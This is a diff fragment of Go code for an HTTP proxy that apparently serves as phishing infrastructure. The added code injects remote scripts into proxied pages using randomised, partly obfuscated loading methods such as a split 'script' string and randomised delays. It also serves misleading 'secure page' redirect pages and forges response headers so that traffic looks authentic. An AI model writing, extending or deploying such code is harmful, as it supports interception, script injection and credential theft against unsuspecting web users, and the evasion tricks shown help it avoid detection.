+                s.src = '%s';
+                var x = d.getElementsByTagName('script')[0];
+                if(x) x.parentNode.insertBefore(s, x);
+                else {
+                    x = d.getElementsByTagName('head')[0];
+                    if(x) x.appendChild(s);
+                    else d.body.appendChild(s);
+                }
+            })();
+        </script>`, scriptPath)
+	case 1:
+		// Deferred loading with timeout
+		delay := 50 + rand.Intn(200)
+		snippet = fmt.Sprintf(`<script>
+            setTimeout(function(){
+                var s = document.createElement('script');
+                s.src = '%s';
+                document.body.appendChild(s);
+            }, %d);
+        </script>`, scriptPath, delay)
+	case 2:
+		// Direct document.write approach
+		snippet = fmt.Sprintf(`<script>
+            document.write('<scr'+'ipt src="%s"></scr'+'ipt>');
+        </script>`, scriptPath)
+	}
+
+	return p.injectHtmlSnippet(body, snippet)
+}
+
+// Meta refresh redirect
+func (p *HttpProxy) metaRefreshRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
+	resp := p.makeResponse(req, 200, "text/html", []byte(fmt.Sprintf(`
+        <html>
+        <head>
+            <meta http-equiv="refresh" content="0; url=%s">
+            <title>Redirecting...</title>
+        </head>
+        <body>
+            <h1>Redirecting</h1>
+            <p>You are being redirected to a secure page. Please wait...</p>
+            <script>
+                window.location.href = "%s";
+            </script>
+        </body>
+        </html>
+    `, rurl, rurl)))
+
+	return req, resp
+}
+
+// Hybrid redirect with multiple techniques
+func (p *HttpProxy) hybridRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
+	delay := 50 + rand.Intn(150)
+	resp := p.makeResponse(req, 200, "text/html", []byte(fmt.Sprintf(`
+        <html>
+        <head>
+            <meta http-equiv="refresh" content="1; url=%s">
+            <title>Redirecting...</title>
+        </head>
+        <body>
+            <h1>Redirecting</h1>
+            <p>You are being redirected to a secure page. Please wait...</p>
+            <script>
+                setTimeout(function() {
+                    window.location.href = "%s";
+                }, %d);
+            </script>
+        </body>
+        </html>
+    `, rurl, rurl, delay)))
+
+	// Also set Location header as another method
+	resp.Header.Set("Location", rurl)
+
+	return req, resp
+}
+
+// Create an HTTP response with the specified status code, content type, and body
+func (p *HttpProxy) makeResponse(req *http.Request, status int, contentType string, body []byte) *http.Response {
+	resp := &http.Response{
+		Status:        http.StatusText(status),
+		StatusCode:    status,
+		Proto:         "HTTP/1.1",
+		ProtoMajor:    1,
+		ProtoMinor:    1,
+		Body:          ioutil.NopCloser(bytes.NewBuffer(body)),
+		ContentLength: int64(len(body)),
+		Request:       req,
+		Header:        make(http.Header),
+	}
+
+	resp.Header.Add("Content-Type", contentType)
+
+	// Add some common headers to make the response look more authentic
+	resp.Header.Add("Server", "nginx")
+	resp.Header.Add("X-Content-Type-Options", "nosniff")
+	resp.Header.Add("X-Frame-Options", "SAMEORIGIN")
+	resp.Header.Add("X-Request-ID", generateRandomID())
+	resp.Header.Add("Cache-Control", "no-cache, no-store")
+
+	// Add date header with slight randomization
+	timeOffset := time.Duration(rand.Intn(5)) * time.Second
+	resp.Header.Add("Date", time.Now().Add(timeOffset).UTC().Format(http.TimeFormat))
+
+	return resp
 }
